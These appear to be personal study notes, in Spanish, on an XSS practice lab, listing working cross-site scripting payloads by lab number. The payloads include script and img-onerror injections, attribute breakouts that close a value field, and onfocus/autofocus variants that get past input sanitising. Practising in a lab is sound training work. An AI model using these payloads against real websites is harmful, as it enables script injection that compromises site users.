# XSS Lab

Tags: #XSS #Challenges

* [sudo.co.il/xss/](https://sudo.co.il/xss/)

```bash
# Para estos laboratorios se debe de mirar el inspector y el código fuente de la web para saber que se debe ir haciendo. Esto ayuda a practicar e ir evadiendo en el codigo fuente para ejecutar un XSS. 
```

## Lab 0

```javascript
<script>alert("XSS")</script>                 // Script basico 
<img src/onerror=alert(document.domain)>      // Para que nos regres el dominio del sitio web 
```

## Lab 1

```javascript
// Debemos de cerrar el campo valor e inyectar el codigo 

"><script>alert("XSS")</script>"              // Debemos de cerrar el campo 'valor' para poder inyectar codigo JavaScript
"><script>alert("XSS")</script><!- -          // <!- - Es un comentario, '--' Asi deberia de ir, seguidos, esto lo hacemo si el SXX se acontece en un campo de login, por lo que el comentario es para evitar el campo de password
" onfocus="alert(1)" autofocus="              // Otra manera de colocar alert 
```

## Lab 2 

```javascript
// Cuando el codigo esta sanitizado, a veces no deja que coloquemos '< o >' por lo que debemos buscar otra manera de colocar alert

" onfocus="alert(1)" autofocus="          
```

## Lab 3 

```javascript
// En este lab nos colocan un guion '-' como forma de sanitizar 

"onfocus="alert(1)" autofocus="
```